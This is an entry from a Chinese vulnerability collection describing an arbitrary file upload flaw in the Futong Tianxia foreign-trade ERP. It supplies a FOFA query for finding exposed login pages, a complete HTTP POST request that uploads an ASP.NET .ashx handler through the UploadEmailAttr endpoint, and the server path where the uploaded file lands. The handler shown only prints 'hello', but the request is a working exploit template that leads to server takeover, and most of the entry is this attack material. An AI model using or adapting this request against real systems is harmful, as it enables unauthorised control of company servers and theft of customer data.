---
fofa: "title="
source: "wy876 漏洞文库"
---

# 富通天下外贸ERP UploadEmailAttr存在任意文件上传漏洞

# 一、漏洞简介
富通天下外贸ERP基于二维界面管理功能，用户可对客户进行精细化的服务和跟踪，客户基本情况、邮件往来样品寄送记录、报价记录、定金收款情况等，信息脉络化，外贸管理软件让您全方位俯瞰客户管理。该系统存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 富通天下外贸ERP

# 三、资产测绘
+ fofa`title="用户登录_富通天下外贸ERP"`
+ 特征


# 四、漏洞复现
```plain
POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: application/x-www-form-urlencoded

<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
public class AverageHandler : IHttpHandler
{
public bool IsReusable
{ get { return true; } }
public void ProcessRequest(HttpContext ctx)
{
ctx.Response.Write("hello");
}
}
```


文件上传位置

```plain
/JoinfWebFile/temp/emailatta/202404/20240417D636C4D1F279410CB324E1AFFE28B141.ashx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zy1m23vzu6i6aq36>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
